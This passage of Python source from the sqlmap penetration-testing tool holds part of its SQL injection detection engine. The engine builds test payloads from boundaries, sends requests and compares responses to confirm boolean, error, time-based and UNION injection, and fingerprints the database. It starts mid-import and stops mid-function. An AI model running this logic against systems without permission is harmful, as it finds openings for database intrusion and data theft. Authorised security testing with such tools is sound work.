singleTimeLogMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import wasLastResponseDBMSError\nfrom lib.core.common import wasLastResponseHTTPError\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import AttribDict\nfrom lib.core.datatype import InjectionDict\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.dicts import FROM_DUMMY_TABLE\nfrom lib.core.dicts import HEURISTIC_NULL_EVAL\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HEURISTIC_TEST\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import NOTE\nfrom lib.core.enums import NULLCONNECTION\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.enums import REDIRECTION\nfrom lib.core.enums import WEB_PLATFORM\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapSilentQuitException\nfrom lib.core.exception import SqlmapSkipTargetException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import BOUNDED_INJECTION_MARKER\nfrom lib.core.settings import CANDIDATE_SENTENCE_MIN_LENGTH\nfrom lib.core.settings import CHECK_INTERNET_ADDRESS\nfrom lib.core.settings import CHECK_INTERNET_VALUE\nfrom lib.core.settings import DEFAULT_COOKIE_DELIMITER\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import DUMMY_NON_SQLI_CHECK_APPENDIX\nfrom lib.core.settings import FI_ERROR_REGEX\nfrom lib.core.settings import FORMAT_EXCEPTION_STRINGS\nfrom lib.core.settings import HEURISTIC_CHECK_ALPHABET\nfrom lib.core.settings import INFERENCE_EQUALS_CHAR\nfrom lib.core.settings import IPS_WAF_CHECK_PAYLOAD\nfrom lib.core.settings import IPS_WAF_CHECK_RATIO\nfrom lib.core.settings import IPS_WAF_CHECK_TIMEOUT\nfrom lib.core.settings import MAX_DIFFLIB_SEQUENCE_LENGTH\nfrom lib.core.settings import MAX_STABILITY_DELAY\nfrom lib.core.settings import NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH\nfrom lib.core.settings import PRECONNECT_INCOMPATIBLE_SERVERS\nfrom lib.core.settings import SINGLE_QUOTE_MARKER\nfrom lib.core.settings import SLEEP_TIME_MARKER\nfrom lib.core.settings import SUHOSIN_MAX_VALUE_LENGTH\nfrom lib.core.settings import SUPPORTED_DBMS\nfrom lib.core.settings import UPPER_RATIO_BOUND\nfrom lib.core.settings import URI_HTTP_HEADER\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.unescaper import unescaper\nfrom lib.request.connect import Connect as Request\nfrom lib.request.comparison import comparison\nfrom lib.request.inject import checkBooleanExpression\nfrom lib.request.templates import getPageTemplate\nfrom lib.techniques.union.test import unionTest\nfrom lib.techniques.union.use import configUnion\nfrom thirdparty import six\nfrom thirdparty.six.moves import http_client as _http_client\n\ndef checkSqlInjection(place, parameter, value):\n    # Store here the details about boundaries and payload used to\n    # successfully inject\n    injection = InjectionDict()\n\n    # Localized thread data needed for some methods\n    threadData = getCurrentThreadData()\n\n    # Favoring non-string specific boundaries in case of digit-like parameter values\n    if isDigit(value):\n        kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or \"\") or _ in (boundary.suffix or \"\") for _ in ('\"', '\\'')))\n        boundaries = kb.cache.intBoundaries\n    elif value.isalpha():\n        kb.cache.alphaBoundaries = kb.cache.alphaBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: not any(_ in (boundary.prefix or \"\") or _ in (boundary.suffix or \"\") for _ in ('\"', '\\'')))\n        boundaries = kb.cache.alphaBoundaries\n    else:\n        boundaries = conf.boundaries\n\n    # Set the flag for SQL injection test mode\n    kb.testMode = True\n\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n    tests = getSortedInjectionTests()\n    seenPayload = set()\n\n    kb.data.setdefault(\"randomInt\", str(randomInt(10)))\n    kb.data.setdefault(\"randomStr\", str(randomStr(10)))\n\n    while tests:\n        test = tests.pop(0)\n\n        try:\n            if kb.endDetection:\n                break\n\n            if conf.dbms is None:\n                # If the DBMS has not yet been fingerprinted (via simple heuristic check\n                # or via DBMS-specific payload) and boolean-based blind has been identified\n                # then attempt to identify with a simple DBMS specific boolean-based\n                # test what the DBMS may be\n                if not injection.dbms and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:\n                    if not Backend.getIdentifiedDbms() and kb.heuristicDbms is None and not kb.droppingRequests:\n                        kb.heuristicDbms = heuristicCheckDbms(injection)\n\n                # If the DBMS has already been fingerprinted (via DBMS-specific\n                # error message, simple heuristic check or via DBMS-specific\n                # payload), ask the user to limit the tests to the fingerprinted\n                # DBMS\n\n                if kb.reduceTests is None and not conf.testFilter and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):\n                    msg = \"it looks like the back-end DBMS is '%s'. \" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))\n                    msg += \"Do you want to skip test payloads specific for other DBMSes? [Y/n]\"\n                    kb.reduceTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []\n\n            # If the DBMS has been fingerprinted (via DBMS-specific error\n            # message, via simple heuristic check or via DBMS-specific\n            # payload), ask the user to extend the tests to all DBMS-specific,\n            # regardless of --level and --risk values provided\n            if kb.extendTests is None and not conf.testFilter and (conf.level < 5 or conf.risk < 3) and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):\n                msg = \"for the remaining tests, do you want to include all tests \"\n                msg += \"for '%s' extending provided \" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or joinValue(injection.dbms, '/'))\n                msg += \"level (%d)\" % conf.level if conf.level < 5 else \"\"\n                msg += \" and \" if conf.level < 5 and conf.risk < 3 else \"\"\n                msg += \"risk (%d)\" % conf.risk if conf.risk < 3 else \"\"\n                msg += \" values? [Y/n]\" if conf.level < 5 and conf.risk < 3 else \" value? [Y/n]\"\n                kb.extendTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []\n\n            title = test.title\n            kb.testType = stype = test.stype\n            clause = test.clause\n            unionExtended = False\n            trueCode, falseCode = None, None\n\n            if conf.httpCollector is not None:\n                conf.httpCollector.setExtendedArguments({\n                    \"_title\": title,\n                    \"_place\": place,\n                    \"_parameter\": parameter,\n                })\n\n            if stype == PAYLOAD.TECHNIQUE.UNION:\n                configUnion(test.request.char)\n\n                if \"[CHAR]\" in title:\n                    if conf.uChar is None:\n                        continue\n                    else:\n                        title = title.replace(\"[CHAR]\", conf.uChar)\n\n                elif \"[RANDNUM]\" in title or \"(NULL)\" in title:\n                    title = title.replace(\"[RANDNUM]\", \"random number\")\n\n                if test.request.columns == \"[COLSTART]-[COLSTOP]\":\n                    if conf.uCols is None:\n                        continue\n                    else:\n                        title = title.replace(\"[COLSTART]\", str(conf.uColsStart))\n                        title = title.replace(\"[COLSTOP]\", str(conf.uColsStop))\n\n                elif conf.uCols is not None:\n                    debugMsg = \"skipping test '%s' because the user \" % title\n                    debugMsg += \"provided custom column range %s\" % conf.uCols\n                    logger.debug(debugMsg)\n                    continue\n\n                match = re.search(r\"(\\d+)-(\\d+)\", test.request.columns)\n                if match and injection.data:\n                    lower, upper = int(match.group(1)), int(match.group(2))\n                    for _ in (lower, upper):\n                        if _ > 1:\n                            __ = 2 * (_ - 1) + 1 if _ == lower else 2 * _\n                            unionExtended = True\n                            test.request._columns = test.request.columns\n                            test.request.columns = re.sub(r\"\\b%d\\b\" % _, str(__), test.request.columns)\n                            title = re.sub(r\"\\b%d\\b\" % _, str(__), title)\n                            test.title = re.sub(r\"\\b%d\\b\" % _, str(__), test.title)\n\n            # Skip test if the user's wants to test only for a specific\n            # technique\n            if conf.technique and isinstance(conf.technique, list) and stype not in conf.technique:\n                debugMsg = \"skipping test '%s' because user \" % title\n                debugMsg += \"specified testing of only \"\n                debugMsg += \"%s techniques\" % \" & \".join(PAYLOAD.SQLINJECTION[_] for _ in conf.technique)\n                logger.debug(debugMsg)\n                continue\n\n            # Skip test if it is the same SQL injection type already\n            # identified by another test\n            if injection.data and stype in injection.data:\n                debugMsg = \"skipping test '%s' because \" % title\n                debugMsg += \"the payload for %s has \" % PAYLOAD.SQLINJECTION[stype]\n                debugMsg += \"already been identified\"\n                logger.debug(debugMsg)\n                continue\n\n            # Parse DBMS-specific payloads' details\n            if \"details\" in test and \"dbms\" in test.details:\n                payloadDbms = test.details.dbms\n            else:\n                payloadDbms = None\n\n            # Skip tests if title, vector or DBMS is not included by the\n            # given test filter\n            if conf.testFilter and not any(conf.testFilter in str(item) or re.search(conf.testFilter, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):\n                debugMsg = \"skipping test '%s' because its \" % title\n                debugMsg += \"name/vector/DBMS is not included by the given filter\"\n                logger.debug(debugMsg)\n                continue\n\n            # Skip tests if title, vector or DBMS is included by the\n            # given skip filter\n            if conf.testSkip and any(conf.testSkip in str(item) or re.search(conf.testSkip, str(item), re.I) for item in (test.title, test.vector, payloadDbms)):\n                debugMsg = \"skipping test '%s' because its \" % title\n                debugMsg += \"name/vector/DBMS is included by the given skip filter\"\n                logger.debug(debugMsg)\n                continue\n\n            if payloadDbms is not None:\n                # Skip DBMS-specific test if it does not match the user's\n                # provided DBMS\n                if conf.dbms and not intersect(payloadDbms, conf.dbms, True):\n                    debugMsg = \"skipping test '%s' because \" % title\n                    debugMsg += \"its declared DBMS is different than provided\"\n                    logger.debug(debugMsg)\n                    continue\n\n                elif kb.dbmsFilter and not intersect(payloadDbms, kb.dbmsFilter, True):\n                    debugMsg = \"skipping test '%s' because \" % title\n                    debugMsg += \"its declared DBMS is different than provided\"\n                    logger.debug(debugMsg)\n                    continue\n\n                elif kb.reduceTests == False:\n                    pass\n\n                # Skip DBMS-specific test if it does not match the\n                # previously identified DBMS (via DBMS-specific payload)\n                elif injection.dbms and not intersect(payloadDbms, injection.dbms, True):\n                    debugMsg = \"skipping test '%s' because \" % title\n                    debugMsg += \"its declared DBMS is different than identified\"\n                    logger.debug(debugMsg)\n                    continue\n\n                # Skip DBMS-specific test if it does not match the\n                # previously identified DBMS (via DBMS-specific error message)\n                elif kb.reduceTests and not intersect(payloadDbms, kb.reduceTests, True):\n                    debugMsg = \"skipping test '%s' because the heuristic \" % title\n                    debugMsg += \"tests showed that the back-end DBMS \"\n                    debugMsg += \"could be '%s'\" % unArrayizeValue(kb.reduceTests)\n                    logger.debug(debugMsg)\n                    continue\n\n            # If the user did not decide to extend the tests to all\n            # DBMS-specific or the test payloads is not specific to the\n            # identified DBMS, then only test for it if both level and risk\n            # are below the corrisponding configuration's level and risk\n            # values\n            if not conf.testFilter and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):\n                # Skip test if the risk is higher than the provided (or default)\n                # value\n                if test.risk > conf.risk:\n                    debugMsg = \"skipping test '%s' because the risk (%d) \" % (title, test.risk)\n                    debugMsg += \"is higher than the provided (%d)\" % conf.risk\n                    logger.debug(debugMsg)\n                    continue\n\n                # Skip test if the level is higher than the provided (or default)\n                # value\n                if test.level > conf.level:\n                    debugMsg = \"skipping test '%s' because the level (%d) \" % (title, test.level)\n                    debugMsg += \"is higher than the provided (%d)\" % conf.level\n                    logger.debug(debugMsg)\n                    continue\n\n            # Skip test if it does not match the same SQL injection clause\n            # already identified by another test\n            clauseMatch = False\n\n            for clauseTest in clause:\n                if injection.clause is not None and clauseTest in injection.clause:\n                    clauseMatch = True\n                    break\n\n            if clause != [0] and injection.clause and injection.clause != [0] and not clauseMatch:\n                debugMsg = \"skipping test '%s' because the clauses \" % title\n                debugMsg += \"differ from the clause already identified\"\n                logger.debug(debugMsg)\n                continue\n\n            # Skip test if the user provided custom character (for UNION-based payloads)\n            if conf.uChar is not None and (\"random number\" in title or \"(NULL)\" in title):\n                debugMsg = \"skipping test '%s' because the user \" % title\n                debugMsg += \"provided a specific character, %s\" % conf.uChar\n                logger.debug(debugMsg)\n                continue\n\n            if stype == PAYLOAD.TECHNIQUE.UNION:\n                match = re.search(r\"(\\d+)-(\\d+)\", test.request.columns)\n                if match and not injection.data:\n                    _ = test.request.columns.split('-')[-1]\n                    if conf.uCols is None and _.isdigit():\n                        if kb.futileUnion is None:\n                            msg = \"it is recommended to perform \"\n                            msg += \"only basic UNION tests if there is not \"\n                            msg += \"at least one other (potential) \"\n                            msg += \"technique found. Do you want to reduce \"\n                            msg += \"the number of requests? [Y/n] \"\n                            kb.futileUnion = readInput(msg, default='Y', boolean=True)\n\n                        if kb.futileUnion and int(_) > 10:\n                            debugMsg = \"skipping test '%s'\" % title\n                            logger.debug(debugMsg)\n                            continue\n\n            infoMsg = \"testing '%s'\" % title\n            logger.info(infoMsg)\n\n            # Force back-end DBMS according to the current test DBMS value\n            # for proper payload unescaping\n            Backend.forceDbms(payloadDbms[0] if isinstance(payloadDbms, list) else payloadDbms)\n\n            # Parse test's <request>\n            comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None\n            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or \"\") else None)\n\n            for boundary in boundaries:\n                injectable = False\n\n                # Skip boundary if the level is higher than the provided (or\n                # default) value\n                # Parse boundary's <level>\n                if boundary.level > conf.level and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):\n                    continue\n\n                # Skip boundary if it does not match against test's <clause>\n                # Parse test's <clause> and boundary's <clause>\n                clauseMatch = False\n\n                for clauseTest in test.clause:\n                    if clauseTest in boundary.clause:\n                        clauseMatch = True\n                        break\n\n                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:\n                    continue\n\n                # Skip boundary if it does not match against test's <where>\n                # Parse test's <where> and boundary's <where>\n                whereMatch = False\n\n                for where in test.where:\n                    if where in boundary.where:\n                        whereMatch = True\n                        break\n\n                if not whereMatch:\n                    continue\n\n                # Parse boundary's <prefix>, <suffix> and <ptype>\n                prefix = boundary.prefix or \"\"\n                suffix = boundary.suffix or \"\"\n                ptype = boundary.ptype\n\n                # Options --prefix/--suffix have a higher priority (if set by user)\n                prefix = conf.prefix if conf.prefix is not None else prefix\n                suffix = conf.suffix if conf.suffix is not None else suffix\n                comment = None if conf.suffix is not None else comment\n\n                # If the previous injections succeeded, we know which prefix,\n                # suffix and parameter type to use for further tests, no\n                # need to cycle through the boundaries for the following tests\n                condBound = (injection.prefix is not None and injection.suffix is not None)\n                condBound &= (injection.prefix != prefix or injection.suffix != suffix)\n                condType = injection.ptype is not None and injection.ptype != ptype\n\n                # If the payload is an inline query test for it regardless\n                # of previously identified injection types\n                if stype != PAYLOAD.TECHNIQUE.QUERY and (condBound or condType):\n                    continue\n\n                # For each test's <where>\n                for where in test.where:\n                    templatePayload = None\n                    vector = None\n\n                    origValue = value\n                    if kb.customInjectionMark in origValue:\n                        origValue = origValue.split(kb.customInjectionMark)[0]\n                        origValue = re.search(r\"(\\w*)\\Z\", origValue).group(1)\n\n                    # Treat the parameter original value according to the\n                    # test's <where> tag\n                    if where == PAYLOAD.WHERE.ORIGINAL or conf.prefix:\n                        if kb.tamperFunctions:\n                            templatePayload = agent.payload(place, parameter, value=\"\", newValue=origValue, where=where)\n                    elif where == PAYLOAD.WHERE.NEGATIVE:\n                        # Use different page template than the original\n                        # one as we are changing parameters value, which\n                        # will likely result in a different content\n\n                        if conf.invalidLogical:\n                            _ = int(kb.data.randomInt[:2])\n                            origValue = \"%s AND %s LIKE %s\" % (origValue, _, _ + 1)\n                        elif conf.invalidBignum:\n                            origValue = kb.data.randomInt[:6]\n                        elif conf.invalidString:\n                            origValue = kb.data.randomStr[:6]\n                        else:\n                            origValue = \"-%s\" % kb.data.randomInt[:4]\n\n                        templatePayload = agent.payload(place, parameter, value=\"\", newValue=origValue, where=where)\n                    elif where == PAYLOAD.WHERE.REPLACE:\n                        origValue = \"\"\n\n                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)\n\n                    # Forge request payload by prepending with boundary's\n                    # prefix and appending the boundary's suffix to the\n                    # test's ' <payload><comment> ' string\n                    if fstPayload:\n                        boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)\n                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)\n                        reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)\n\n                        if reqPayload:\n                            stripPayload = re.sub(r\"(\\A|\\b|_)([A-Za-z]{4}((?<!LIKE))|\\d+)(_|\\b|\\Z)\", r\"\\g<1>.\\g<4>\", reqPayload)\n                            if stripPayload in seenPayload:\n                                continue\n                            else:\n                                seenPayload.add(stripPayload)\n                    else:\n                        reqPayload = None\n\n                    # Perform the test's request and check whether or not the\n                    # payload was successful\n                    # Parse test's <response>\n                    for method, check in test.response.items():\n                        check = agent.cleanupPayload(check, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or \"\") else None)\n\n                        # In case of boolean-based blind SQL injection\n                        if method == PAYLOAD.METHOD.COMPARISON:\n                            # Generate payload used for comparison\n                            def genCmpPayload():\n                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) and BOUNDED_INJECTION_MARKER not in (value or \"\") else None)\n\n                                # Forge response payload by prepending with\n                                # boundary's prefix and appending the boundary's\n                                # suffix to the test's ' <payload><comment> '\n                                # string\n                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)\n                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)\n                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)\n\n                                return cmpPayload\n\n                            # Useful to set kb.matchRatio at first based on False response content\n                            kb.matchRatio = None\n                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)\n                            suggestion = None\n                            Request.queryPage(genCmpPayload(), place, raise404=False)\n                            falsePage, falseHeaders, falseCode = threadData.lastComparisonPage or \"\", threadData.lastComparisonHeaders, threadData.lastComparisonCode\n                            falseRawResponse = \"%s%s\" % (falseHeaders, falsePage)\n\n                            # Checking if there is difference between current FALSE, original and heuristics page (i.e. not used parameter)\n                            if not any((kb.negativeLogic, conf.string, conf.notString, conf.code)):\n                                try:\n                                    ratio = 1.0\n                                    seqMatcher = getCurrentThreadData().seqMatcher\n\n                                    for current in (kb.originalPage, kb.heuristicPage):\n                                        seqMatcher.set_seq1(current or \"\")\n                                        seqMatcher.set_seq2(falsePage or \"\")\n                                        ratio *= seqMatcher.quick_ratio()\n\n                                    if ratio == 1.0:\n                                        continue\n                                except (MemoryError, OverflowError):\n                                    pass\n\n                            # Perform the test's True request\n                            trueResult = Request.queryPage(reqPayload, place, raise404=False)\n                            truePage, trueHeaders, trueCode = threadData.lastComparisonPage or \"\", threadData.lastComparisonHeaders, threadData.lastComparisonCode\n                            trueRawResponse = \"%s%s\" % (trueHeaders, truePage)\n\n                            if trueResult and not(truePage == falsePage and not any((kb.nullConnection, conf.code))):\n                                # Perform the test's False request\n                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=False)\n\n                                if not falseResult:\n                                    if kb.negativeLogic:\n                                        boundPayload = agent.prefixQuery(kb.data.randomStr, prefix, where, clause)\n                                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)\n                                        errorPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)\n\n                                        errorResult = Request.queryPage(errorPayload, place, raise404=False)\n                                        if errorResult:\n                                            continue\n                                    elif kb.heuristicPage and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):\n                                        _ = comparison(kb.heuristicPage, None, getRatioValue=True)\n                                        if (_ or 0) > (kb.matchRatio or 0):\n                                            kb.matchRatio = _\n                                            logger.debug(\"adjusting match ratio for current parameter to %.3f\" % kb.matchRatio)\n\n                                    # Reducing false-positive \"appears\" messages in heavily dynamic environment\n                                    if kb.heavilyDynamic and not Request.queryPage(reqPayload, place, raise404=False):\n                                        continue\n\n                                    injectable = True\n\n                                elif (threadData.lastComparisonRatio or 0) > UPPER_RATIO_BOUND and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):\n                                    originalSet = set(getFilteredPageContent(kb.pageTemplate, True, \"\\n\").split(\"\\n\"))\n                                    trueSet = set(getFilteredPageContent(truePage, True, \"\\n\").split(\"\\n\"))\n                                    falseSet = set(getFilteredPageContent(falsePage, True, \"\\n\").split(\"\\n\"))\n\n                                    if threadData.lastErrorPage and threadData.lastErrorPage[1]:\n                                        errorSet = set(getFilteredPageContent(threadData.lastErrorPage[1], True, \"\\n\").split(\"\\n\"))\n                                    else:\n                                        errorSet = set()\n\n                                    if originalSet == trueSet != falseSet:\n                                        candidates = trueSet - falseSet - errorSet\n\n                                        if candidates:\n                                            candidates = sorted(candidates, key=len)\n                                            for candidate in candidates:\n                                                if re.match(r\"\\A[\\w.,! ]+\\Z\", candidate) and ' ' in candidate and candidate.strip() and len(candidate) > CANDIDATE_SENTENCE_MIN_LENGTH:\n                                                    suggestion = conf.string = candidate\n                                                    injectable = True\n\n                                                    infoMsg = \"%sparameter '%s' appears to be '%s' injectable (with --string=\\\"%s\\\")\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title, repr(conf.string).lstrip('u').strip(\"'\"))\n                                                    logger.info(infoMsg)\n\n                                                    break\n\n                            if injectable:\n                                if kb.pageStable and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):\n                                    if all((falseCode, trueCode)) and falseCode != trueCode:\n                                        suggestion = conf.code = trueCode\n\n                                        infoMsg = \"%sparameter '%s' appears to be '%s' injectable (with --code=%d)\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title, conf.code)\n                                        logger.info(infoMsg)\n                                    else:\n                                        trueSet = set(extractTextTagContent(trueRawResponse))\n                                        trueSet |= set(__ for _ in trueSet for __ in _.split())\n\n                                        falseSet = set(extractTextTagContent(falseRawResponse))\n                                        falseSet |= set(__ for _ in falseSet for __ in _.split())\n\n                                        if threadData.lastErrorPage and threadData.lastErrorPage[1]:\n                                            errorSet = set(extractTextTagContent(threadData.lastErrorPage[1]))\n                                            errorSet |= set(__ for _ in errorSet for __ in _.split())\n                                        else:\n                                            errorSet = set()\n\n                                        candidates = filterNone(_.strip() if _.strip() in trueRawResponse and _.strip() not in falseRawResponse else None for _ in (trueSet - falseSet - errorSet))\n\n                                        if candidates:\n                                            candidates = sorted(candidates, key=len)\n                                            for candidate in candidates:\n                                                if re.match(r\"\\A\\w{2,}\\Z\", candidate):  # Note: length of 1 (e.g. --string=5) could cause trouble, especially in error message pages with partially reflected payload content\n                                                    break\n\n                                            suggestion = conf.string = candidate\n\n                                            infoMsg = \"%sparameter '%s' appears to be '%s' injectable (with --string=\\\"%s\\\")\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title, repr(conf.string).lstrip('u').strip(\"'\"))\n                                            logger.info(infoMsg)\n\n                                        if not any((conf.string, conf.notString)):\n                                            candidates = filterNone(_.strip() if _.strip() in falseRawResponse and _.strip() not in trueRawResponse else None for _ in (falseSet - trueSet))\n\n                                            if candidates:\n                                                candidates = sorted(candidates, key=len)\n                                                for candidate in candidates:\n                                                    if re.match(r\"\\A\\w+\\Z\", candidate):\n                                                        break\n\n                                                suggestion = conf.notString = candidate\n\n                                                infoMsg = \"%sparameter '%s' appears to be '%s' injectable (with --not-string=\\\"%s\\\")\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title, repr(conf.notString).lstrip('u').strip(\"'\"))\n                                                logger.info(infoMsg)\n\n                                if not suggestion:\n                                    infoMsg = \"%sparameter '%s' appears to be '%s' injectable \" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title)\n                                    singleTimeLogMessage(infoMsg)\n\n                        # In case of error-based SQL injection\n                        elif method == PAYLOAD.METHOD.GREP:\n                            # Perform the test's request and grep the response\n                            # body for the test's <grep> regular expression\n                            try:\n                                page, headers, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)\n                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)\n                                output = output or extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None, re.DOTALL | re.IGNORECASE)\n                                output = output or extractRegexResult(check, listToStrValue((headers[key] for key in headers if key.lower() != URI_HTTP_HEADER.lower()) if headers else None), re.DOTALL | re.IGNORECASE)\n                                output = output or extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)\n\n                                if output:\n                                    result = output == '1'\n\n                                    if result:\n                                        infoMsg = \"%sparameter '%s' is '%s' injectable \" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title)\n                                        logger.info(infoMsg)\n\n                                        injectable = True\n\n                            except SqlmapConnectionException as ex:\n                                debugMsg = \"problem occurred most likely because the \"\n                                debugMsg += \"server hasn't recovered as expected from the \"\n                                debugMsg += \"used error-based payload ('%s')\" % getSafeExString(ex)\n                                logger.debug(debugMsg)\n\n                        # In case of time-based blind or stacked queries\n                        # SQL injections\n                        elif method == PAYLOAD.METHOD.TIME:\n                            # Perform the test's request\n                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)\n                            trueCode = threadData.lastCode\n\n                            if trueResult:\n                                # Extra validation step (e.g. to check for DROP protection mechanisms)\n                                if SLEEP_TIME_MARKER in reqPayload:\n                                    falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, \"0\"), place, timeBasedCompare=True, raise404=False)\n                                    if falseResult:\n                                        continue\n\n                                # Confirm test's results\n                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)\n\n                                if trueResult:\n                                    infoMsg = \"%sparameter '%s' appears to be '%s' injectable \" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title)\n                                    logger.info(infoMsg)\n\n                                    injectable = True\n\n                        # In case of UNION query SQL injection\n                        elif method == PAYLOAD.METHOD.UNION:\n                            # Test for UNION injection and set the sample\n                            # payload as well as the vector.\n                            # NOTE: vector is set to a tuple with 6 elements,\n                            # used afterwards by Agent.forgeUnionQuery()\n                            # method to forge the UNION query payload\n\n                            configUnion(test.request.char, test.request.columns)\n\n                            if len(kb.dbmsFilter or []) == 1:\n                                Backend.forceDbms(kb.dbmsFilter[0])\n                            elif not Backend.getIdentifiedDbms():\n                                if kb.heuristicDbms is None:\n                                    if kb.heuristicTest == HEURISTIC_TEST.POSITIVE or injection.data:\n                                        warnMsg = \"using unescaped version of the test \"\n                                        warnMsg += \"because of zero knowledge of the \"\n                                        warnMsg += \"back-end DBMS. You can try to \"\n                                        warnMsg += \"explicitly set it with option '--dbms'\"\n                                        singleTimeWarnMessage(warnMsg)\n                                else:\n                                    Backend.forceDbms(kb.heuristicDbms)\n\n                            if unionExtended:\n                                infoMsg = \"automatically extending ranges for UNION \"\n                                infoMsg += \"query injection technique tests as \"\n                                infoMsg += \"there is at least one other (potential) \"\n                                infoMsg += \"technique found\"\n                                singleTimeLogMessage(infoMsg)\n\n                            # Test for UNION query SQL injection\n                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)\n\n                            if isinstance(reqPayload, six.string_types):\n                                infoMsg = \"%sparameter '%s' is '%s' injectable\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter, title)\n                                logger.info(infoMsg)\n\n                                injectable = True\n\n                                # Overwrite 'where' because it can be set\n                                # by unionTest() directly\n                                where = vector[6]\n\n                        kb.previousMethod = method\n\n                        if conf.offline:\n                            injectable = False\n\n                    # If the injection test was successful feed the injection\n                    # object with the test's details\n                    if injectable is True:\n                        # Feed with the boundaries details only the first time a\n                        # test has been successful\n                        if injection.place is None or injection.parameter is None:\n                            if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):\n                                injection.parameter = place\n                            else:\n                                injection.parameter = parameter\n\n                            injection.place = place\n                            injection.ptype = ptype\n                            injection.prefix = prefix\n                            injection.suffix = suffix\n                            injection.clause = clause\n\n                        # Feed with test details every time a test is successful\n                        if hasattr(test, \"details\"):\n                            for key, value in test.details.items():\n                                if key == \"dbms\":\n                                    injection.dbms = value\n\n                                    if not isinstance(value, list):\n                                        Backend.setDbms(value)\n                                    else:\n                                        Backend.forceDbms(value[0], True)\n\n                                elif key == \"dbms_version\" and injection.dbms_version is None and not conf.testFilter:\n                                    injection.dbms_version = Backend.setVersion(value)\n\n                                elif key == \"os\" and injection.os is None:\n                                    injection.os = Backend.setOs(value)\n\n                        if vector is None and \"vector\" in test and test.vector is not None:\n                            vector = test.vector\n\n                        injection.data[stype] = AttribDict()\n                        injection.data[stype].title = title\n                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)\n                        injection.data[stype].where = where\n                        injection.data[stype].vector = vector\n                        injection.data[stype].comment = comment\n                        injection.data[stype].templatePayload = templatePayload\n                        injection.data[stype].matchRatio = kb.matchRatio\n                        injection.data[stype].trueCode = trueCode\n                        